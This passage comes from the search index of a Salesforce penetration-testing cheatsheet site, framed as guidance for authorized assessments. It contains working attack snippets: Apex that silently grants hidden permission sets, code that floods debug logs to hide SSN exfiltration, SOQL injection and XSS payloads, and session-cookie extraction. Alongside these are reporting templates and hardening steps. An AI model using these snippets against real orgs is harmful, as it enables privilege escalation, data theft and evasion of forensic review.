PermissionSetAssignment(\n                        PermissionSetId = 'HIDDEN_PERMISSION_SET_ID',\n                        AssigneeId = u.Id,\n                        ExpirationDate = Date.today().addDays(1)  // Temporary assignment\n                    );\n                    insert psa;\n                } catch (Exception e) {\n                    // Fail silently\n                }\n            }\n        }\n\n        public void finish(Database.BatchableContext bc) {\n            // Clean up after batch completion\n        }\n    }\n}\n</code></pre></p> <p>Debug Log Pollution: <pre><code>public class LogPollution {\n    public static void polluteLogs() {\n        // Generate high volume of legitimate-looking debug logs\n        for (Integer i = 0; i &lt; 1000; i++) {\n            System.debug('Processing record batch: ' + i);\n            System.debug('Validation check passed for item: ' + i);\n            System.debug('Business rule applied successfully: ' + i);\n        }\n\n        // Hide malicious activity within noise\n        List&lt;Contact&gt; contacts = [SELECT Id, Name, SSN__c FROM Contact LIMIT 100];\n        System.debug('Processing contact records: ' + contacts.size());\n\n        // Actual malicious activity disguised as routine processing\n        for (Contact c : contacts) {\n            if (c.SSN__c != null) {\n                // Exfiltrate data disguised as routine logging\n                System.debug('Contact processed: ID=' + c.Id + ' Data=' + c.SSN__c);\n            }\n        }\n    }\n}\n</code></pre></p> <p>Impact: Reduced forensic evidence, investigation hindrance, detection avoidance.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#2-legitimate-tool-abuse","title":"2. Legitimate Tool Abuse","text":"<p>Objective: Using authorized tools and features for malicious purposes to avoid detection.</p> <p>Data Loader Abuse: <pre><code>def abuse_data_loader():\n    \"\"\"Use Data Loader for bulk data extraction\"\"\"\n    # Configure Data Loader for extraction\n    config = {\n        'sfdc.endpoint': 'https://instance.salesforce.com',\n        'sfdc.username': 'legitimate_user@company.com',\n        'sfdc.password': 'password_with_token',\n        'process.operation': 'extract',\n        'process.mappingFile': 'contact_mapping.sdl',\n        'dataAccess.type': 'csvRead',\n        'dataAccess.name': 'contacts_extract.csv'\n    }\n\n    # Extract appears as routine data maintenance\n    print(\"Performing routine data synchronization...\")\n    # Data Loader extraction process\n</code></pre></p> <p>Workbench Exploitation: <pre><code>// Use Workbench for SOQL injection testing disguised as data analysis\nconst malicious_queries = [\n    \"SELECT Id, Name FROM Account WHERE Name = 'x' UNION SELECT Id, Password__c FROM User--\",\n    \"SELECT Id FROM Contact WHERE Email = 'test' OR (SELECT COUNT() FROM User WHERE Profile.Name = 'System Administrator') &gt; 0--\"\n];\n\n// Execute via Workbench query interface\nmalicious_queries.forEach(query =&gt; {\n    console.log(\"Executing data analysis query:\", query);\n    // Execute through Workbench UI\n});\n</code></pre></p> <p>Developer Console Abuse: <pre><code>// Execute malicious code via Developer Console anonymous blocks\n// Appears as routine development/debugging activity\n\n// Data exfiltration disguised as debugging\nList&lt;Account&gt; accounts = [SELECT Id, Name, AnnualRevenue FROM Account WHERE AnnualRevenue &gt; 1000000];\nSystem.debug('High value accounts analysis:');\nfor (Account a : accounts) {\n    System.debug('Account: ' + a.Name + ' Revenue: ' + a.AnnualRevenue);\n    // Data captured in debug logs for extraction\n}\n\n// Privilege escalation disguised as testing\nUser testUser = [SELECT Id FROM User WHERE Username = 'target@company.com'];\nPermissionSetAssignment psa = new PermissionSetAssignment(\n    PermissionSetId = 'HIGH_PRIVILEGE_PERMISSION_SET_ID',\n    AssigneeId = testUser.Id\n);\ninsert psa;\nSystem.debug('Test permission assignment completed');\n</code></pre></p> <p>Browser Extension Abuse: <pre><code>// Use Salesforce Inspector for session manipulation\n// Disguised as routine administrative tasks\n\n// Extract session information\nconst sessionId = document.cookie.match(/sid_Client=([^;]+)/)[1];\nconsole.log(\"Current session for backup:\", sessionId);\n\n// Manipulate user records through Inspector\nconst userData = {\n    Id: '005XX000001b0Qw',\n    IsActive: false,\n    ProfileId: 'STANDARD_PROFILE_ID'\n};\n\n// Use Inspector's data manipulation features\nconsole.log(\"Updating user configuration:\", userData);\n</code></pre></p> <p>Impact: Detection avoidance through legitimate tool usage, plausible deniability.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#reporting-evidence-collection","title":"Reporting &amp; Evidence Collection","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#1-critical-findings-documentation","title":"1. Critical Findings Documentation","text":"<p>Objective: Systematically document security vulnerabilities with evidence and impact assessment.</p> <p>Finding Template Structure: <pre><code>## Finding: [Vulnerability Name]\n\n### Executive Summary\nBrief description of the vulnerability and its business impact.\n\n### Technical Details\n**Vulnerability Type**: [OWASP Category]\n**CVSS Score**: [Score/10]\n**Risk Level**: [Critical/High/Medium/Low]\n\n### Root Cause Analysis\nDetailed explanation of the underlying security flaw.\n\n### Proof of Concept\nStep-by-step reproduction instructions with screenshots/code.\n\n### Evidence\n- Screenshots of vulnerable configurations\n- Code snippets demonstrating the flaw\n- SOQL query results showing data exposure\n- API response samples\n\n### Business Impact\n- Data confidentiality impact\n- Integrity concerns\n- Availability risks\n- Compliance implications\n- Potential financial impact\n\n### Remediation Steps\n1. Immediate actions (workarounds)\n2. Short-term fixes\n3. Long-term security improvements\n4. Validation steps\n\n### References\n- Salesforce security documentation\n- Industry best practices\n- Compliance requirements\n</code></pre></p> <p>Evidence Collection Script: <pre><code>def collect_security_evidence():\n    \"\"\"Automated evidence collection for security findings\"\"\"\n    import json\n    import datetime\n\n    evidence = {\n        'timestamp': datetime.datetime.now().isoformat(),\n        'org_info': {},\n        'user_permissions': {},\n        'security_settings': {},\n        'vulnerable_code': {},\n        'data_exposure': {}\n    }\n\n    # Collect organizational information\n    evidence['org_info'] = {\n        'org_id': 'REDACTED_ORG_ID',\n        'instance': 'na123',\n        'edition': 'Enterprise',\n        'sandbox': False\n    }\n\n    # Document permission vulnerabilities\n    evidence['user_permissions'] = {\n        'over_privileged_users': 15,\n        'modify_all_data_users': 8,\n        'view_all_data_users': 12,\n        'guest_user_permissions': ['Read Contact', 'Read Account']\n    }\n\n    # Security configuration issues\n    evidence['security_settings'] = {\n        'password_policy': {\n            'min_length': 8,  # Below recommended 12\n            'complexity': 'Low',\n            'lockout_threshold': 10  # Above recommended 5\n        },\n        'session_security': {\n            'ip_locking': False,\n            'timeout': 480,  # 8 hours, above recommended 2\n            'concurrent_sessions': True\n        }\n    }\n\n    return evidence\n\ndef generate_executive_summary(findings):\n    \"\"\"Generate executive summary of security assessment\"\"\"\n    summary = {\n        'critical_findings': len([f for f in findings if f.risk == 'Critical']),\n        'high_findings': len([f for f in findings if f.risk == 'High']),\n        'medium_findings': len([f for f in findings if f.risk == 'Medium']),\n        'low_findings': len([f for f in findings if f.risk == 'Low']),\n        'total_findings': len(findings),\n        'overall_risk': 'High',  # Based on critical/high findings\n        'key_recommendations': [\n            'Implement MFA for all users',\n            'Review and restrict administrative permissions',\n            'Enable Platform Encryption for sensitive fields',\n            'Strengthen password policies',\n            'Implement IP restrictions'\n        ]\n    }\n    return summary\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#2-compliance-mapping","title":"2. Compliance Mapping","text":"<p>Objective: Map identified vulnerabilities to relevant compliance frameworks.</p> <p>Framework Mapping: <pre><code>def map_findings_to_compliance():\n    \"\"\"Map security findings to compliance frameworks\"\"\"\n\n    compliance_mapping = {\n        'SOX': {\n            'applicable_controls': ['Access Controls', 'Change Management', 'Data Integrity'],\n            'violated_controls': ['SOX-ITG-01', 'SOX-ITG-03'],\n            'findings': ['Over-privileged users', 'Weak password policies']\n        },\n        'PCI_DSS': {\n            'applicable_controls': ['Access Control', 'Encryption', 'Network Security'],\n            'violated_controls': ['PCI-DSS-7', 'PCI-DSS-8'],\n            'findings': ['Unencrypted credit card fields', 'Weak authentication']\n        },\n        'GDPR': {\n            'applicable_controls': ['Data Protection', 'Access Rights', 'Data Breach'],\n            'violated_controls': ['GDPR-Art25', 'GDPR-Art32'],\n            'findings': ['PII exposure', 'Inadequate access controls']\n        },\n        'HIPAA': {\n            'applicable_controls': ['Administrative Safeguards', 'Physical Safeguards', 'Technical Safeguards'],\n            'violated_controls': ['HIPAA-164.308', 'HIPAA-164.312'],\n            'findings': ['Medical data exposure', 'Missing encryption']\n        },\n        'ISO_27001': {\n            'applicable_controls': ['A.9 Access Control', 'A.10 Cryptography', 'A.12 Operations Security'],\n            'violated_controls': ['A.9.1.1', 'A.9.2.1', 'A.10.1.1'],\n            'findings': ['Access control weaknesses', 'Encryption gaps']\n        }\n    }\n\n    return compliance_mapping\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#3-risk-assessment-matrix","title":"3. Risk Assessment Matrix","text":"<p>Objective: Quantify and prioritize security risks for business decision-making.</p> <p>Risk Calculation Framework: <pre><code>def calculate_risk_score(vulnerability):\n    \"\"\"Calculate quantitative risk score\"\"\"\n\n    # Impact factors (1-5 scale)\n    impact_factors = {\n        'data_sensitivity': vulnerability.data_sensitivity,  # 1-5\n        'user_count_affected': min(vulnerability.affected_users / 100, 5),  # Scale to 1-5\n        'business_criticality': vulnerability.business_impact,  # 1-5\n        'compliance_impact': vulnerability.compliance_risk  # 1-5\n    }\n\n    # Likelihood factors (1-5 scale)\n    likelihood_factors = {\n        'exploitability': vulnerability.exploitability,  # 1-5\n        'attack_vector': vulnerability.attack_complexity,  # 1-5\n        'authentication_required': 5 - vulnerability.auth_bypass,  # Inverse scale\n        'user_interaction': 5 - vulnerability.user_interaction  # Inverse scale\n    }\n\n    # Calculate weighted scores\n    impact_score = sum(impact_factors.values()) / len(impact_factors)\n    likelihood_score = sum(likelihood_factors.values()) / len(likelihood_factors)\n\n    # Overall risk score (1-25 scale)\n    risk_score = impact_score * likelihood_score\n\n    # Risk categorization\n    if risk_score &gt;= 20:\n        risk_level = 'Critical'\n    elif risk_score &gt;= 15:\n        risk_level = 'High'\n    elif risk_score &gt;= 10:\n        risk_level = 'Medium'\n    elif risk_score &gt;= 5:\n        risk_level = 'Low'\n    else:\n        risk_level = 'Informational'\n\n    return {\n        'score': risk_score,\n        'level': risk_level,\n        'impact': impact_score,\n        'likelihood': likelihood_score\n    }\n\ndef prioritize_remediation(findings):\n    \"\"\"Prioritize remediation based on risk scores and business factors\"\"\"\n\n    prioritized_findings = sorted(findings, key=lambda x: (\n        x.risk_score,\n        x.ease_of_exploitation,\n        x.affected_user_count\n    ), reverse=True)\n\n    remediation_timeline = {\n        'immediate': [],  # Critical findings, fix within 24-48 hours\n        'short_term': [],  # High findings, fix within 1-2 weeks\n        'medium_term': [],  # Medium findings, fix within 1-3 months\n        'long_term': []  # Low findings, fix within next release cycle\n    }\n\n    for finding in prioritized_findings:\n        if finding.risk_level == 'Critical':\n            remediation_timeline['immediate'].append(finding)\n        elif finding.risk_level == 'High':\n            remediation_timeline['short_term'].append(finding)\n        elif finding.risk_level == 'Medium':\n            remediation_timeline['medium_term'].append(finding)\n        else:\n            remediation_timeline['long_term'].append(finding)\n\n    return remediation_timeline\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#remediation-hardening-recommendations","title":"Remediation &amp; Hardening Recommendations","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#1-immediate-security-controls","title":"1. Immediate Security Controls","text":"<p>Critical Actions (24-48 hours):</p> <ol> <li>Enable MFA for All Users:</li> <li>Navigate to Setup \u2192 Single Sign-On Settings \u2192 Multi-Factor Authentication</li> <li>Enable \"Multi-factor authentication for all direct UI logins\"</li> <li> <p>Require MFA for high-privilege profiles</p> </li> <li> <p>Review Administrative Permissions:    <pre><code>-- Audit and restrict users with dangerous permissions\nSELECT Id, Username, Profile.Name \nFROM User \nWHERE Profile.PermissionsModifyAllData = true \n   OR Profile.PermissionsViewAllData = true\n</code></pre></p> </li> <li> <p>Enable Session Security:</p> </li> <li>Setup \u2192 Security \u2192 Session Settings</li> <li>Enable \"Lock sessions to IP address\"</li> <li>Set session timeout to 2 hours maximum</li> <li> <p>Enable \"High assurance session required\"</p> </li> <li> <p>Implement IP Restrictions:</p> </li> <li>Setup \u2192 Security \u2192 Network Access</li> <li>Configure IP ranges for admin profiles</li> <li>Enable \"Enforce IP restrictions\" for sensitive profiles</li> </ol>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#2-short-term-security-improvements-1-2-weeks","title":"2. Short-Term Security Improvements (1-2 weeks)","text":"<ol> <li> <p>Field-Level Security Implementation:    <pre><code>// Implement proper FLS checks in all Apex code\npublic with sharing class SecureController {\n    public List&lt;Contact&gt; getContacts() {\n        if (!Schema.sObjectType.Contact.fields.SSN__c.isAccessible()) {\n            throw new AuraHandledException('Access Denied');\n        }\n        return [SELECT Id, Name, SSN__c FROM Contact WITH SECURITY_ENFORCED];\n    }\n}\n</code></pre></p> </li> <li> <p>Platform Encryption Deployment:</p> </li> <li>Setup \u2192 Security \u2192 Platform Encryption</li> <li>Enable encryption for sensitive fields (SSN, Credit Card, etc.)</li> <li> <p>Implement proper key management</p> </li> <li> <p>Sharing Model Hardening:</p> </li> <li>Review and restrict Organization-Wide Defaults</li> <li>Audit sharing rules for over-permissive access</li> <li>Implement role hierarchy properly</li> </ol>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#3-long-term-security-strategy-1-3-months","title":"3. Long-Term Security Strategy (1-3 months)","text":"<ol> <li> <p>Security Monitoring Implementation:    <pre><code>-- Create monitoring queries for suspicious activity\nSELECT Id, UserId, User.Username, LoginTime, SourceIp, Status\nFROM LoginHistory \nWHERE LoginTime = LAST_N_DAYS:1 \n  AND Status IN ('Failed', 'Invalid Password')\nORDER BY LoginTime DESC\n</code></pre></p> </li> <li> <p>Code Security Standards:</p> </li> <li>Implement mandatory code reviews</li> <li>Deploy SAST tools in CI/CD pipeline</li> <li> <p>Enforce secure coding standards</p> </li> <li> <p>Incident Response Procedures:</p> </li> <li>Develop security incident playbooks</li> <li>Implement automated threat detection</li> <li>Create user security training programs</li> </ol>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#conclusion","title":"Conclusion","text":"<p>This comprehensive Salesforce pentesting cheatsheet provides expert-level guidance for security professionals conducting authorized security assessments. The methodologies, queries, and techniques documented here represent real-world attack vectors and should be used responsibly within the bounds of proper authorization.</p> <p>Key takeaways for effective Salesforce security testing:</p> <ol> <li>Focus on Custom Code: Standard Salesforce is generally secure; vulnerabilities primarily exist in custom development</li> <li>Understand the Platform: Salesforce's unique security model requires specialized knowledge</li> <li>Test Systematically: Follow a methodical approach covering all attack surfaces</li> <li>Document Thoroughly: Provide clear evidence and remediation guidance</li> <li>Think Like an Attacker: Chain vulnerabilities for maximum impact assessment</li> </ol> <p>Remember: The goal is not just to break things, but to help organizations build more secure Salesforce implementations. Use this knowledge responsibly to strengthen cloud security postures and protect sensitive business data.</p> <p>This cheatsheet represents a compilation of expert knowledge and should be used only for authorized security assessments. Always ensure proper written authorization before conducting any security testing activities.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/","title":"Salesforce   2","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Preparation &amp; Legal Considerations</li> <li>Reconnaissance &amp; Information Gathering</li> <li>Authentication &amp; Session Management</li> <li>Authorization &amp; Access Control Assessment</li> <li>Data Leak &amp; Sensitive Info Exposure</li> <li>Custom Code Security Testing</li> <li>Platform Configuration &amp; Metadata Security</li> <li>API &amp; Integration Security</li> <li>Client-Side &amp; UX Vulnerabilities</li> <li>Advanced &amp; Chainable Attack Vectors</li> <li>Persistence, Lateral Movement &amp; Post-Exploitation</li> <li>Reporting, Remediation &amp; References</li> </ol>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#1-preparation-legal-considerations","title":"1. Preparation &amp; Legal Considerations","text":"<p>Checklist - Test Accounts for:   - Admin, Standard User, Guest, Integration - Tooling:   - Salesforce CLI (sfdx), simple_salesforce, Postman, Burp Suite, Salesforce Inspector, PMD, browser dev tools</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#2-reconnaissance-information-gathering","title":"2. Reconnaissance &amp; Information Gathering","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#salesforce-edition-instance","title":"Salesforce Edition &amp; Instance","text":"<p>Identify org context, features, and technical footprint</p> <p>UI Navigation - Setup &gt; Company Information for Org ID, Edition, Instance</p> <p>SOQL <pre><code>SELECT OrganizationType, Edition, InstanceName FROM Organization\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#user-profile-enumeration","title":"User &amp; Profile Enumeration","text":"<p>Find high-value/admin accounts and role mappings.</p> <p>SOQL <pre><code>SELECT Id, Username, Email, Profile.Name, UserRole.Name, IsActive FROM User\nORDER BY Profile.Name\n</code></pre></p> <p>Find users with sensitive permissions: <pre><code>SELECT Assignee.Name, PermissionSet.PermissionsModifyAllData\nFROM PermissionSetAssignment\nWHERE PermissionSet.PermissionsModifyAllData = TRUE OR PermissionSet.PermissionsViewAllData = TRUE\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#public-endpoints-sites","title":"Public Endpoints &amp; Sites","text":"<p>Identify unauthenticated exposure (Sites/Communities).</p> <ul> <li>Setup &gt; Digital Experiences &gt; All Sites: Review for exposed URLs and guest content</li> <li>Manual: Visit home page while unauthenticated, try API endpoints (<code>/services/data/</code>)</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#custom-code-app-footprint","title":"Custom Code &amp; App Footprint","text":"<p>Enumerate all custom code and package attack surface.</p> <ul> <li>Setup &gt; Custom Code (Apex Classes/Triggers, Visualforce, LWC/Aura)</li> <li>Setup &gt; Installed Packages</li> <li>SOQL <pre><code>SELECT Name, NamespacePrefix, ApiVersion FROM ApexClass\nWHERE NamespacePrefix = null AND ApiVersion &lt; 45.0\n</code></pre></li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#3-authentication-session-management","title":"3. Authentication &amp; Session Management","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#password-policy-lockout","title":"Password Policy &amp; Lockout","text":"<p>Weak policies = brute force risk.</p> <ul> <li>Setup &gt; Security &gt; Password Policies</li> <li>SOQL <pre><code>SELECT MinimumPasswordLength, PasswordComplexity, LockoutInterval FROM Organization\n</code></pre></li> <li>Testing</li> <li>Hydra/Burp: Try brute force with discovered/minimal password policy</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#multi-factor-authentication-mfa","title":"Multi-Factor Authentication (MFA)","text":"<p>Check for enforcement.</p> <p>SOQL <pre><code>SELECT Id, Username, UserPreferencesMfaRequired FROM User WHERE IsActive = TRUE\n</code></pre></p> <ul> <li>Setup &gt; Security &gt; MFA: Review enforcement policy</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#session-security","title":"Session Security","text":"<p>Check for session fixation/hijacking.</p> <ul> <li>Setup &gt; Security &gt; Session Settings (IP lock, timeout, domain lock)</li> <li>Testing</li> <li>Replay session cookies from new IP/device</li> <li>Attempt session fixation via re-used session IDs</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#login-flows-sso","title":"Login Flows &amp; SSO","text":"<p>SOQL <pre><code>SELECT Id, DeveloperName, UsedForAuthentication FROM Flow WHERE Type = 'LoginFlow'\nSELECT Id, Name, Issuer, EntityId FROM SamlSsoConfig\n</code></pre> - Review for logic weaknesses, MFA/SAML bypasses</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#4-authorization-access-control-assessment","title":"4. Authorization &amp; Access Control Assessment","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#profile-permission-set-analysis","title":"Profile &amp; Permission Set Analysis","text":"<p>Locate over-privileged users, map escalation paths.</p> <p>SOQL: Find high-privilege/profiles permission sets <pre><code>SELECT Name, PermissionsModifyAllData, PermissionsViewAllData FROM Profile\n</code></pre> <pre><code>SELECT AssigneeId, PermissionSet.Name, PermissionSet.PermissionsModifyAllData\nFROM PermissionSetAssignment WHERE PermissionSet.PermissionsModifyAllData = TRUE\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#field-level-security-fls","title":"Field-Level Security (FLS)","text":"<p>Check for control bypass/exposed fields.</p> <p>SOQL <pre><code>SELECT Id, ParentId, Field, PermissionsRead, PermissionsEdit\nFROM FieldPermissions WHERE Field LIKE '%SSN%' OR Field LIKE '%Credit%'\n</code></pre> Test as low-priv user by querying sensitive fields (expect no access).</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#sharing-model-record-access","title":"Sharing Model &amp; Record Access","text":"<p>Find over-permissive OWD &amp; sharing rules.</p> <ul> <li>Setup &gt; Security &gt; Sharing Settings</li> </ul> <p>SOQL <pre><code>SELECT SObjectType, DefaultExternal, DefaultInternal FROM OrganizationWideDefault\n</code></pre> - Test with practical IDOR: Change record ID in URL as a low-privileged user.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#guest-user-community-exposure","title":"Guest User &amp; Community Exposure","text":"<p>SOQL <pre><code>SELECT Id, Name FROM User WHERE Profile.Name LIKE '%Guest%'\n</code></pre> - Sites &gt; Public Access Settings: Review CRUD permissions for guest profile.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#5-data-leak-sensitive-info-exposure","title":"5. Data Leak &amp; Sensitive Info Exposure","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#sensitive-data-discovery","title":"Sensitive Data Discovery","text":"<p>SOQL <pre><code>SELECT Id, Name, SSN__c FROM Contact WHERE SSN__c != NULL\n</code></pre> - Scan for custom objects/fields with possible PII/HCI.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#data-export-capabilities","title":"Data Export Capabilities","text":"<p>Where to look: - Setup &gt; Data Export; Data Loader/Workbench - Bulk data extraction using API tokens</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#reportdashboard-overexposure","title":"Report/Dashboard Overexposure","text":"<p>SOQL <pre><code>SELECT Id, Name, FolderName FROM Report WHERE FolderName = 'Public Reports'\n</code></pre> - Reports &gt; All Reports: Export as low-priv user</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#chatter-feeds-public-info","title":"Chatter, Feeds &amp; Public Info","text":"<p>SOQL <pre><code>SELECT Body, CreatedBy.Name FROM FeedItem WHERE Body LIKE '%password%' OR Body LIKE '%secret%'\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#6-custom-code-security-testing","title":"6. Custom Code Security Testing","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#soql-injection-in-apex","title":"SOQL Injection in Apex","text":"<p>Vulnerability - Dynamic SOQL using untrusted input</p> <p>Example Payload <pre><code>String userInput = \"' OR Name != '' OR '\";\nString query = 'SELECT Id, Name FROM Account WHERE Name = \\'' + userInput + '\\'';\nList&lt;Account&gt; results = Database.query(query);\n</code></pre></p> <ul> <li>Test: Submit payloads through any field/endpoint that feeds into SOQL</li> </ul> <p>Remediation: Always use bind variables (<code>WHERE Name = :userInput</code>)</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#fls-crud-bypasses","title":"FLS &amp; CRUD Bypasses","text":"<p>Vulnerability - Code ignores object/field-level security.</p> <p>Testing - As low-priv user, attempt to trigger DML or read objects/fields not granted via FLS.</p> <p>Remediation - Always call <code>isAccessible()</code>, <code>isUpdatable()</code>, utilize <code>WITH SECURITY_ENFORCED</code> in SOQL</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#xss-in-visualforcelightning","title":"XSS in Visualforce/Lightning","text":"<p>Vulnerability - Outputting unescaped user data.</p> <p>Code Example <pre><code>&lt;apex:outputText value=\"{!userInput}\" escape=\"false\"/&gt;\n</code></pre> - Inject payload: <code>&lt;script&gt;alert(42)&lt;/script&gt;</code></p> <p>Remediation - Always use <code>escape=\"true\"</code>, use sanitized variables</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#auralwc-exposures","title":"Aura/LWC Exposures","text":"<ul> <li>@AuraEnabled methods called by unintended users.</li> <li>DOM-based XSS via unsafe innerHTML</li> </ul> <p>Remediation: Set Apex Class security, avoid unsanitized DOM writes.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#7-platform-configuration-metadata-security","title":"7. Platform Configuration &amp; Metadata Security","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#critical-settings-audit","title":"Critical Settings Audit","text":"<p>IP Whitelisting/Restrictions <pre><code>SELECT Id, IpAddress, IpAddressMask FROM IpRestriction\n</code></pre> - Setup &gt; Security &gt; Network Access</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#custom-settings-custom-metadata","title":"Custom Settings &amp; Custom Metadata","text":"<ul> <li>Setup &gt; Custom Settings / Custom Metadata</li> <li>Look for hardcoded secrets, API keys, or URLs</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#metadata-api-abuse","title":"Metadata API Abuse","text":"<ul> <li>Unauthorized modification of profiles/validation rules via API (SOAP/REST)</li> <li>Test with <code>/services/Soap/m/XX.0</code> and manipulate metadata</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#8-api-integration-security","title":"8. API &amp; Integration Security","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#connected-apps-oauth","title":"Connected Apps &amp; OAuth","text":"<p>SOQL <pre><code>SELECT Name, CallbackUrl, ConsumerKey FROM ConnectedApplication\n</code></pre></p> <p>Test - Manipulate OAuth <code>redirect_uri</code>, overbroad scopes (<code>full</code>, <code>api</code>) - Use unauthorized/abused OAuth tokens for data exfiltration</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#named-credentials","title":"Named Credentials","text":"<ul> <li>Examine endpoint security (must be HTTPS)</li> <li>Test for SSRF, credential leak via misconfigured objects.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#restsoapbulk-api","title":"REST/SOAP/Bulk API","text":"<ul> <li>Test for excessive permissions via API tokens</li> <li>Abuse <code>/services/data/vXX.0/{sobjects/query/apexrest}</code> endpoints</li> </ul> <p>API Abuse Example <pre><code>curl -H \"Authorization: Bearer &lt;TOKEN&gt;\" \\\n     \"https://&lt;instance&gt;.salesforce.com/services/data/v58.0/sobjects/Contact\"\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#9-client-side-ux-vulnerabilities","title":"9. Client-Side &amp; UX Vulnerabilities","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%202/#xss-dom-based-attacks","title":"XSS &amp; DOM-Based Attacks","text":"<ul> <li>Insert payloads into custom inputs/components or formula fields</li> <li>Look for 